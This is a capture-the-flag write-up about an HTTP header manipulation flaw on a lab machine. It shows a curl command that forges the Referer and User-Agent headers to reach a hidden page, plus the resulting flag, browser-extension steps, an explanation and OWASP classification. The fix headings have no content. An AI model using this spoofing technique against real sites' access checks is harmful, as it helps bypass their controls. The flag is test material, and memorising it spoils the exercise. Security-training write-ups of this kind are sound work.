# HTTP Header Manipulation Vulnerability

## How I Found It

### Step-by-Step Discovery Process

1. **Initial Reconnaissance**
   - Systematically explored the website
   - Viewed page source code (`http://192.168.1.16/?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f`)
   - Examined HTML comments for hidden clues

2. **Discovered Hidden Hints in HTML Comments**
   
   Found two critical hints buried in HTML comments:
   
   **Hint 1 - Referer Header:**
   ```html
   <!-- You must come from : "https://www.nsa.gov/". -->
   ```
   
   **Hint 2 - User-Agent Header:**
   ```html
   <!-- Let's use this browser : "ft_bornToSec". It will help you a lot. -->
   ```
3. **Hypothesis Formation**
   - The comments suggested the application validates HTTP headers
   - The hash link likely points to a protected/hidden page
   - Access would require both correct Referer and User-Agent headers

---

## How I Exploited It

### Method 1: Using cURL (Command Line)

**Successful Command:**
```bash
curl -H "Referer: https://www.nsa.gov/" \
     -H "User-Agent: ft_bornToSec" \
     http://192.168.1.16/?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f
```

**Command Breakdown:**
- `-H "Referer: https://www.nsa.gov/"` → Sets the HTTP Referer header
- `-H "User-Agent: ft_bornToSec"` → Sets the HTTP User-Agent header
- Target URL with the hash parameter

**Result:**
```html
<center>
  <h2 style="margin-top:50px;">
    The flag is : f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
  </h2>
  <br/>
  <img src="images/win.png" alt="" width=200px height=200px>
</center>
```

**Flag:** `f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188`

### Method 2: Using Browser Developer Tools

**Step-by-Step:**

1. **Install a Header Modification Extension**
   - Chrome: "ModHeader" or "Simple Modify Headers"
   - Firefox: "Modify Header Value" or "Simple Modify Headers"

2. **Configure Headers**
   - Add header: `Referer` → `https://www.nsa.gov/`
   - Add header: `User-Agent` → `ft_bornToSec`

3. **Navigate to the Target URL**
   ```
   http://192.168.1.16/?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f
   ```

4. **View Result**
   - The page displays the flag
   - Without the correct headers, access is denied or returns different content

---

## Why It Works (Vulnerability Explanation)

### What is HTTP Header Manipulation?

HTTP headers are metadata sent with every web request. They contain information like:
- **Referer**: The URL of the previous page (where the request came from)
- **User-Agent**: Browser/client identification string
- **Cookie**: Session and authentication tokens
- **Host**: Target server hostname

**The Problem:** HTTP headers are **completely controlled by the client** and can be easily modified.

### The Vulnerability

The application uses HTTP headers for **access control** or **authentication**, which is fundamentally insecure.

---

## How to Fix It

### 1. Never Use HTTP Headers for Security Decisions

### 2. Implement Proper Authentication

### 3. Use Token-Based Authentication

### 4. Implement Role-Based Access Control (RBAC)

### 5. Security Best Practices

---

## OWASP Classification

- **Primary:** A01:2021 – Broken Access Control
- **Secondary:** A07:2021 – Identification and Authentication Failures
- **Related:** A04:2021 – Insecure Design

---

## Conclusion

This HTTP Header Manipulation vulnerability demonstrates a fundamental security flaw: **trusting client-controlled data for access control decisions**.

**Remember:** HTTP headers are sent by the client and can be trivially modified. They should NEVER be used for authentication, authorization, or any security-critical decision.

The fix requires implementing proper session-based or token-based authentication with server-side validation of user permissions stored in a trusted data source (like a database).